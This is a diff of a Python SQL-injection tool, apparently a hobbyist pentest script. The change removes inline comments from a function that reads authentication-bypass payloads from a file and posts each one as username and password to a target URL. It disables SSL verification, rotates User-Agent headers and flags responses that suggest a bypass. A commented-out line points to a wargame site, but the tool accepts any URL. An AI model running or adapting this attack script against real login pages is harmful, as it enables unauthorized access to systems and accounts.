@@ -50,30 +50,30 @@ async def auth_SQL_inj_HEADER(urls):
     """This is the authentication bypass sql injection block. it occurs when the input datas are not validated and attacker can inject its own code to the database and bypass the authentication"""
     try:
         """This is the main block of our exploit program which sending the payloads. """
-        global pattern,htmlpattern #* use these two variables as 
-        done = False #* Set done flag as false
-        filename = "auth_bypass.txt" #* opens the file of the sqlinjection payload
-        current_directory = os.path.dirname(os.path.abspath(__file__)) #* get the current file and directory
-        file_path = os.path.join(current_directory, filename) #* Get the file path
+        global pattern,htmlpattern  
+        done = False 
+        filename = "auth_bypass.txt" 
+        current_directory = os.path.dirname(os.path.abspath(__file__)) 
+        file_path = os.path.join(current_directory, filename) 
 
-        with open(file_path, "r") as file: #* Opens the file path as read mode
-            payload = file.read() #* read the file
-            rows = payload.split("\n") #* split the rows
-            sorted_rows = sorted(rows) #* Sort the rows
-            sorted_payload = "\n".join(sorted_rows) #* Jions within the program
-            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) #* Prints the payload
+        with open(file_path, "r") as file: 
+            payload = file.read()
+            rows = payload.split("\n") 
+            sorted_rows = sorted(rows) 
+            sorted_payload = "\n".join(sorted_rows) #* 
+            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) 
             requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
             # url = "https://redtiger.labs.overthewire.org/level1.php"
-            req = requests.get(url=urls,verify=False) #* Sends a request and set the verify flag as false
+            req = requests.get(url=urls,verify=False) 
             # assert req.status_code == 200
-            if req.status_code == 200: #* If the host is up we inform the user
+            if req.status_code == 200: 
                 ask = input(f"[{datetime.now()}]{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}[INFO]**Looks like the host is up: {Fore.RESET}{Fore.YELLOW}{urls} {Fore.RESET}{Fore.GREEN} \nDo you want to send the payload above to the website?** ")
                 logging.info(f"Could get a 200 request for the target: {urls} in the time : {datetime.now()}")
 
-                if ask.lower() == "y": #* if y
-                    for line in sorted_payload.split("\n"): #* Create a for loop in the program
+                if ask.lower() == "y":
+                    for line in sorted_payload.split("\n"): 
                         #############################################################33
-                        params = { #* set parameters
+                        params = { 
                             "username": line,
                             "password": line
                         }
@@ -81,26 +81,26 @@ async def auth_SQL_inj_HEADER(urls):
                         # print(line)
                         await Prepare_the_headers()
                         for headerR in headers:
-                            ack = requests.post(url=urls, data=params,verify=False,headers={"User-Agent": header}) #* send a post requests with a payload
-                            print(f"[{datetime.now()}]|**[INFO]Current payload: | {Fore.RESET}{Style.BRIGHT}{line} |with status code|:{Fore.RESET}{Fore.BLUE}{ack.status_code}\n|Headers:|{header}**") #* prints the current status code with its payload
+                            ack = requests.post(url=urls, data=params,verify=False,headers={"User-Agent": header}) 
+                            print(f"[{datetime.now()}]|**[INFO]Current payload: | {Fore.RESET}{Style.BRIGHT}{line} |with status code|:{Fore.RESET}{Fore.BLUE}{ack.status_code}\n|Headers:|{header}**") 
                             # print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
-                            await asyncio.sleep(5) #! This prevent the program from crashing 
-                            if "error" in ack.text: #* if the error word was in the test result we inform the user
+                            await asyncio.sleep(5) 
+                            if "error" in ack.text: 
                                 print(f"[{datetime.now()}]{Fore.RESET}{Fore.LIGHTWHITE_EX}|**[INFO]Vulnerability found in the response code:|ack.text\n|Headers:|{header}**")
                                 
-                            vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) #* use regex patterns for the better searching
+                            vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) 
                             htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
-                            if vuln: #* if the regex pattern founds we inform the user
+                            if vuln: 
                                 print(f"[{datetime.now()}]**[INFO]{Fore.RESET}{Fore.LIGHTYELLOW_EX}  | **Vulnerability found in the response code: |{Fore.RESET}{Fore.CYAN} {ack.text} | vulnerability count:| {len(vuln)}|Attack:||authentication bypass SQL injection|\n|Headers:**|{header}**")
                                 logging.info(f"[INFO] vulnerability may exists in the target url:{urls} attack type:{attack_type} in the time:{datetime.now()}")
-                                await asyncio.sleep(3) #* Stop the program for 5 sec
+                                await asyncio.sleep(3) 
                             
                             if htmlVULN:
                                 print(f"[{datetime.now()}] {Fore.RESET}{Fore.LIGHTMAGENTA_EX} |**Vulnerability found:|{Fore.RESET}{Fore.LIGHTBLUE_EX}{ack.text}|with the count of|:{Fore.RESET}{Fore.LIGHTMAGENTA_EX}{len(htmlVULN)}\n|Headers:**|{Fore.RESET}{Fore.LIGHTYELLOW_EX}{header}")
                                 logging.info(f"[INFO]Could find a vulnerability in the website html form:{urls} time:{datetime.now()} note:the vulnerability might not be that much significant.")
                                 await asyncio.sleep(3)
                             
-                            word = "id" in req.text                             #* inform the user the other results
+                            word = "id" in req.text                             
                             errword = "error" in req.text
                             if word:
                                 print(f"[{datetime.now()}]**[INFO]{Fore.RESET}{Fore.LIGHTYELLOW_EX}  |** Vulnerability found in the response code: |{Fore.RESET}{Fore.CYAN} {ack.text} | vulnerability count:| {len(vuln)}|Attack:||authentication bypass SQL injection|\n|Headers:**|{header}**")
@@ -114,7 +114,7 @@ async def auth_SQL_inj_HEADER(urls):
                                 
                             
                                 
-                        if req.status_code == 302:                                              #*If could even break to the website we inform the user
+                        if req.status_code == 302:                                             
                             print(f"[{datetime.now()}]",Fore.GREEN+"**[INFO]Could found injectable area on the website with the keyword:","|",line,"|"+"|Attack:|"+"authentication bypass SQL injection","\n|Headers:**|",header)
                             logging.info(f"Could bypass the authentication in the target:{urls} in the time:{datetime.now()}")
                             done = True
